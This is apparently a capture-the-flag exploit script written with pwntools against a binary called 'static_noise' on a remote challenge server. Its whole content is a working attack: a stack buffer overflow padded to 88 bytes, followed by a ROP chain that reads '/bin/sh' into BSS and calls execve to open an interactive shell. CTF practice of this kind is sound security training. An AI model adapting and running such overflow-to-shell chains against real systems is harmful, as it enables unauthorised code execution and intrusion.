from pwn import *

binary = './static_noise'
elf = ELF(binary)
rop = ROP(elf)

s = remote("challenges.cybersecuritychallenge.pt", 23121)

bss = 0x006bb2e0  # writable BSS address to store "/bin/sh"

pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
# Must use syscall;ret (0x475005) — the plain syscall at 0x40128c jumps back in a loop
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]  # 0x475005

# Chain 1: read(0, bss, 8)  -- reads "/bin/sh\x00" from stdin into BSS
chain  = p64(pop_rax) + p64(0)          # SYS_read
chain += p64(pop_rdi) + p64(0)          # fd = stdin
chain += p64(pop_rsi) + p64(bss)        # buf = BSS
chain += p64(pop_rdx) + p64(8)          # count = 8
chain += p64(syscall_ret)

# Chain 2: execve(bss, 0, 0)
chain += p64(pop_rax) + p64(59)         # SYS_execve
chain += p64(pop_rdi) + p64(bss)        # pathname = "/bin/sh"
chain += p64(pop_rsi) + p64(0)          # argv = NULL
chain += p64(pop_rdx) + p64(0)          # envp = NULL
chain += p64(syscall_ret)

# Buffer layout in ask_for_password:
#   rbp-0x50: buf[0x50]  (80 bytes)
#   rbp+0x00: saved rbp  (8 bytes)
#   rbp+0x08: return address  <-- chain lands here
# Total padding before RIP = 0x58 = 88 bytes
password = b"dGhpcyBiaW5hcnkgd2FzIHN0YXRpY2FsbHkgbGlua2VkLCBvdmVyZmxvdyBteSBidWZmZXIh"
payload = password + b"A" * (0x58 - len(password)) + chain

s.recvuntil(b"Password: ")
s.sendline(payload)
s.send(b"/bin/sh\x00")  # fed to the read() syscall
s.interactive()